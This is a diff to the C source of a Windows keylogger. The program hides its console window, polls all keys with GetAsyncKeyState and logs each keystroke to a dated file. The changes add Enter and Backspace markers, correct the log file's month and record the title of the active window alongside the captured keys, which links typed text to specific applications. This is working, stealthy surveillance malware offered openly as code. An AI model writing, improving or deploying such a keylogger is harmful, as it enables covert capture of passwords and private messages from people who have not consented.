@@ -4,7 +4,7 @@ BASIC KEYLOGGER for windows platforms using
 GetAsyncKeyState
 @author: Velorek
 @version: 0.1
-@last modified: AUG 2018
+@last modified: MAY 2021
 ===========================================================
 */
 #include <stdio.h>
@@ -19,17 +19,21 @@ GetAsyncKeyState
 #define EXITKEY "\e1234\0"
 #define CLEANSTR "\0"
 #define K_BACKSPACE 8
-#define K_CHARBSPACE '<'
+#define K_ENTER 13
+#define K_BSPSTR "{BKSPC}"
+#define K_ENTERSTR "{ENTER}"
+#define IDD_COMBO 2032
 
 //HELP MESSAGES
 
-
+char oldWindowTitle[256];
 /* FUNCTION DECLARATIONS */
 
 long    fileSize(FILE * fileHandler);
 int     openFile(FILE ** fileHandler, char *fileName, char *mode);
 int     closeFile(FILE * fileHandler);
 long    writeToFile(FILE * fileHandler,char ch);
+int     writeWindowTitle(FILE * fileHandler);
 int     file_exists(FILE **fileHandler, char *fileStr);
 int     kbhit(char *ch);
 
@@ -37,6 +41,7 @@ int kbhit(char *ch){
 int i=0, keystate=0;
 int exitFlag=0, ok=0;
 char oldch=0;
+
 
   oldch = *ch;
   //Run through all key scancodes from 0 to 255
@@ -71,6 +76,7 @@ int main() {
   char fileStr[80];
   int exitFlag =0;
   int i=0;
+  int month;
   char ch=0;
   time_t now = 0;
   struct tm *ltm;
@@ -80,8 +86,10 @@ int main() {
    ltm = localtime(&now);
 
   ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
+  month = ltm->tm_mon;
+  month++;
   sprintf(daystr, "%d", ltm->tm_mday);
-  sprintf(monstr, "%d", ltm->tm_mon);
+  sprintf(monstr, "%d", month);
   strcpy(fileStr, FILENAME);
   strcat(fileStr, daystr);
   strcat(fileStr, "_");
@@ -98,6 +106,7 @@ int main() {
      if (kbhit(&ch) == 1) {
 
             //To exit program -> ESC + 1234
+            writeWindowTitle(fileHandler);
             if (i==0) strcpy(charcombination, CLEANSTR);
             if (ch==27 || i>0) {
                 charcombination[i] = ch;
@@ -108,7 +117,8 @@ int main() {
                 }
             }
             if (ch>31 && ch<128) writeToFile(fileHandler,ch);
-            if (ch==K_BACKSPACE) writeToFile(fileHandler,K_CHARBSPACE);//Backspace
+            if (ch == K_ENTER) fprintf(fileHandler, "%s\n",K_ENTERSTR); //Enter
+            if (ch==K_BACKSPACE) fprintf(fileHandler, "%s",K_BSPSTR); //Backspace
      }
      if (strcmp(charcombination,EXITKEY)==0){
         exitFlag = 1;
@@ -141,7 +151,7 @@ long writeToFile(FILE * fileHandler, char ch) {
 
   //Read char by char
   if(fileHandler != NULL) {
-     fseek(fileHandler, 0, SEEK_END);
+     //fseek(fileHandler, 0, SEEK_END);
      fprintf(fileHandler, "%c",ch);
      fflush(fileHandler); //to avoid pre-buffering
   }
@@ -160,4 +170,15 @@ if (*fileHandler != NULL){
    //file doesn't exists or cannot be opened
 }
 return ok;
+}
+
+int writeWindowTitle(FILE * fileHandler)
+{
+  HWND hwndDlg;
+  char newWindowTitle[256];
+  hwndDlg = GetForegroundWindow();
+  GetWindowText(hwndDlg, newWindowTitle, 256);
+  if (strcmp(oldWindowTitle,newWindowTitle) != 0) {fprintf(fileHandler,"\n[%s]\n",newWindowTitle);}
+  oldWindowTitle[0] = '\0';
+  strcat(oldWindowTitle,newWindowTitle);
 }
